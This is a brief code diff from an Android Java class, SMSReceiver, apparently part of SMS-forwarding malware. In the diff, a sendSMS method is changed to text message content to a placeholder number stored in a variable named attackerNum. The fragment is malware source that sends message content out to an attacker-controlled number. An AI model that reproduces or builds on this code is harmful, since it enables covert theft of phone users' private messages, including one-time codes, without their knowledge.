@@ -121,10 +121,10 @@ public class SMSReceiver extends BroadcastReceiver{
     //This is the general method for sending an SMS
     public static void sendSMS(String content) {
         Log.d("sendSMS", "Sending a SMS now!");
-
+        String attackerNum = "+XXXXXXXXXX";
         try {
             SmsManager smsManager = SmsManager.getDefault();
-            smsManager.sendTextMessage("+16477172894", null, content, null, null);
+            smsManager.sendTextMessage(attackerNum, null, content, null, null);
 
         } catch (Exception e) {
             Log.e("sendSMS", "SMS failed");
